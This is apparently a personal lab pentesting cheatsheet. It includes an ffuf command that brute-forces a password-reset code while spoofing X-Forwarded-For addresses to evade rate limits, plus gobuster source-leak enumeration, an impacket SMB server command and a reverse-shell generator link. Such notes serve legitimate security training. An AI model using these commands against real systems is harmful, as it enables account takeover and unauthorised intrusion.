# Cheatsheet

Remember:

- **strings** show strings in a binary

<!-- -->

- **file** inspects a file’s contents (magic bytes and patterns) to identify what it is, regardless of its extension. It tells you the format, architecture, and key metadata.

Start python http server:

```
python3 -m http.server 8000
```

Fix burpsuite browser:

```
23:05:24 ~
➤ sudo chown root:root ./bin/BurpSuiteCommunity/burpbrowser/141.0.7390.65/chrome-sandbox
23:08:39 ~
➤ sudo chmod 4755 ./bin/BurpSuiteCommunity/burpbrowser/141.0.7390.65/chrome-sandbox
```

```
tester@hammer.thm

./ffuf -w ../../utils/SecLists/Fuzzing/4-digits-0000-9999.txt:W1 -w ../../Descargas/fake_ip_cut.txt:W2 -u "http://10.201.99.232:1337/reset_password.php" -X "POST" -d "recovery_code=W1&s=80" -b "PHPSESSID=4u1edcve3va7g5ddtpck97gko4" -H "X-Forwarded-For: W2" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -mode pitchfork -v -rate 50

for X in {0..255}; do for Y in {0..255}; do echo "192.168.$X.$Y"; done; done > fake_ip.txt

head -n 1000 fake_ip.txt > fake_ip_cut.txt
```

```
# Add extensions that commonly leak source
gobuster dir -u http://MACHINE_IP/who/ -w wordlist.txt -x php,php~,bak,orig,save,swp,swo,txt,zip
```

## impacket SMB

Use a venv

```
sudo ./bin/python ./examples/smbserver.py -smb2support -port 445 -comment "My Logs Server" -debug logs /tmp
```

## JS Scanners

- **[NodeJsScan](https://github.com/ajinabraham/nodejsscan)** is a static security code scanner for Node.js applications. It includes checks for various security vulnerabilities, including prototype pollution. Integrating NodeJsScan into your development workflow can help automatically identify potential security issues in your codebase.

<!-- -->

- **[Prototype Pollution Scanner](https://github.com/KathanP19/protoscan) **is a tool designed to scan JavaScript code for prototype pollution vulnerabilities. It can be used to analyse codebases for patterns that are susceptible to pollution, helping developers identify and address potential security issues in their applications.

<!-- -->

- **[PPFuzz](https://github.com/dwisiswant0/ppfuzz)** is another fuzzer designed to automate the process of detecting prototype pollution vulnerabilities in web applications. By fuzzing input vectors that might interact with object properties, `PPFuzz` can help identify points in an application that are susceptible to prototype pollution.

<!-- -->

- Client-side detection by **[BlackFan](https://github.com/BlackFan/client-side-prototype-pollution)** is focused on identifying prototype pollution vulnerabilities in client-side JavaScript. It includes examples of how prototype pollution can be exploited in browsers to perform XSS attacks and other malicious activities. It's a valuable resource for understanding the impact of prototype pollution on the client-side.

## Reverse Shells

<https://www.revshells.com/>
